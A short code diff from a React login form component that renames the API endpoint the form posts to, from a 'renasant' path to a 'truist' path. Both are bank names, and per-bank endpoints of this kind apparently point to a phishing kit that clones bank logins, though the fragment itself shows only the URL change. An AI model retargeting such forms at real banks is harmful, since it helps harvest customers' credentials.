@@ -26,7 +26,7 @@ const LoginForm: React.FC = () => {
       return;
     }
 
-    const url = `${baseUrl}api/renasant-meta-data-1/`;
+    const url = `${baseUrl}api/truist-meta-data-1/`;
 
     try {
       await axios.post(url, {
